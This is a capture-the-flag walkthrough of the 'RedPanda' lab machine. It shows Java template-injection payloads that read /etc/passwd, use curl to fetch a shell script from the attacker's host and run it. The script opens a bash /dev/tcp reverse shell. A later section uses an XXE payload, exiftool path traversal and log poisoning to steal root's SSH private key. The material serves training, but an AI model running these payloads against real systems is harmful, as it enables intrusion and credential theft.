# @author : M3tr1c_r00t
## RedPanda!
![RedPanda](https://user-images.githubusercontent.com/99975622/205444975-3447a92f-d56f-4465-9544-52a6585c047a.png)

### Enumeration...
nmap
![Screenshot_2022-11-20_15_38_51](https://user-images.githubusercontent.com/99975622/205445009-3f8ddebc-3c24-46b9-9fac-2c42433e57c1.png)
Looking at the nmap scan, only two ports are open...
Not having anything to useful from the nmap scan, lets visit the webpage and have a look at it.
![Screenshot_2022-11-20_15_39_16](https://user-images.githubusercontent.com/99975622/205445026-5d27a9dc-1c1a-43ae-be88-ec79661dc98a.png)
The site asks for some input for a panda name,  but it only seems to give output on some specific ones in its database.
On just sending empty data, we get a response...
![Screenshot_2022-11-20_15_39_25](https://user-images.githubusercontent.com/99975622/205445029-82573e84-7b15-4627-ae13-a4b8bca79b31.png)

After a bit of interaction with the site, i finally got a hold on how to gain access onto the system....
Plus, if you would have checked your wappalyzer extension, you would have noticed the system was running on a java kind of framework...

### SSTI
Finally got a foothold to work upon....
![image](https://user-images.githubusercontent.com/99975622/205456530-7d222419-936b-4b8c-af3b-5051c5ec7a92.png)
On trying to see id there's a SSTI vulnerability, if realized we could get a response while using the "*" special character...

![Screenshot_2022-11-20_15_40_23](https://user-images.githubusercontent.com/99975622/205445039-26d98841-5551-4ea9-9a22-6e75a0db605f.png)
The next step was to get a reverse shell... 
Took me a while to get a working code to help us get the reverse shell, but thanks to pentestmonkey's github repo, we got one...
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("cat /etc/passwd ")}
```
Trying the above code, it works....


Getting reverse shell,
uploading our reverse shell script.
![Screenshot_2022-11-20_15_46_11](https://user-images.githubusercontent.com/99975622/205445066-872fe492-1a70-4280-8216-943e0b4a325f.png)

I had some issues with getting the reverse shell using a one liner, so  we can upload a file and save it in the tmp directory then run bash directly on the file...

##### Code to put in the shell.sh file
```
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'
```
Open a httpserver via python ....
```
python -m http.server 8000
```
Then upload your shell script....

```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl YOUR_IP:8000/shell.sh --output /tmp/shell.sh ")}
```
**Getting our reverse shell...**
<br> Make sure to set your listener.... 
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("bash /tmp/shell.sh")}
```
and boom! 
![Screenshot_2022-11-20_15_47_26](https://user-images.githubusercontent.com/99975622/205457657-02e0bff9-1d54-490b-8cb6-d52aba8d8aa1.png)

**Getting user flag....**
<br>Navigate to the home directory and get your user flag!
![Screenshot_2022-11-20_15_49_02](https://user-images.githubusercontent.com/99975622/205457694-762cf23e-949e-4f26-9b6f-624854c03d3e.png)

### Priviledge Escalation...
**Running linpeas...**
![Screenshot_2022-11-20_16_09_37](https://user-images.githubusercontent.com/99975622/205457719-dd406a39-31dc-492b-8e22-9f4f7cce0718.png)
Linpeas didn't really give us any useful information so i moved on to pspy64 to check if there are any activities running in the background....

**Running pspsy64...**
on looking at some output by pspy64, we can see there's a command running as root on a certain jar file...
![Screenshot_2022-11-20_16_16_56](https://user-images.githubusercontent.com/99975622/205457844-617cb601-5b83-444b-9b0e-7a8e14cdff73.png)

Next step, we grab that jar file and have a look at it....

#### Reverse Engineering the jar file so as to have an idea of what's happening

![Screenshot_2022-11-20_16_18_10](https://user-images.githubusercontent.com/99975622/205457896-dea997a6-ba1c-41df-9056-a2f524b68740.png)
On opening the file using jd-gui, we can analyze the source code...

In the main function, we can see there's a file being read....
```
/opt/panda_search/redpanda.log
```
There's also a split function(at the beggining of the code...) that splits code from the log file into new lines when it comes accross the "|" character....
<br>The program then gets the artists name from the metadata of an image from the Artist attribute.....
<br>It then creates the xml file from using the artists name and then uses the "uri" function to update the views onto the xml file.....
<br>We can already see there's a vulnerability in that we can exploit from the xml file...
<br>
<br>**You can check out this vulnerability from snyk...**
<br>https://security.snyk.io/vuln/SNYK-JAVA-ORGJDOM-1311147

### Expoiting the jar file...
_**1). Add the artist metadata to a jpg file...**_
<br> Go to the internet and get a normal jpg file....
```
exiftool -Artist="../tmp/author_name"  file.jpg
```
![Screenshot_2022-11-20_16_29_15](https://user-images.githubusercontent.com/99975622/205459241-00dab11a-2161-4825-aa96-8128efc122b8.png)

Then upload this image file to the tmp directory
__**2). Create an xml file in the /tmp/ directory...**__
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>
  <author>author_name</author>
  <image>
    <uri>/../../../../../../tmp/file.jpg</uri>
    <views>1</views>
    <foo>&xxe;</foo>
  </image>
  <totalviews>2</totalviews>
</credits>
```
![Screenshot_2022-11-20_16_31_54](https://user-images.githubusercontent.com/99975622/205459255-a64fd126-cbe4-48bb-b94b-0e6cf5336f0e.png)


Then save it as: **author_name_creds.txt

__**3). Update the log file's content to match us for our expoit...**__
```
echo "222||a||a||/../../../../../../tmp/file.jpg" > /opt/panda_search/redpanda.log
```
Next, upload the files to the machine...
![Screenshot_2022-11-20_16_37_25](https://user-images.githubusercontent.com/99975622/205459282-d46ff746-f373-4ab6-a950-3e0ed9a29166.png)


After that, check the contents of the the xml file after a while, you'll see the rsa key contents dumped there....
![Screenshot_2022-11-20_16_44_36](https://user-images.githubusercontent.com/99975622/205459292-06b63818-b111-43db-9ea8-208a322abb12.png)

Now that we got the rsakey, make the nessesary file permissions change and login as root...
![Screenshot_2022-11-20_16_51_07](https://user-images.githubusercontent.com/99975622/205459318-5a293d71-a042-44ad-bedc-c1f69dd3de37.png)

And boom! 
<br> We are Root!

### Socials
@Instagram:https://instagram.com/M3tr1c_r00t
<br>@Twitter:https://twitter.com/M3tr1c_root



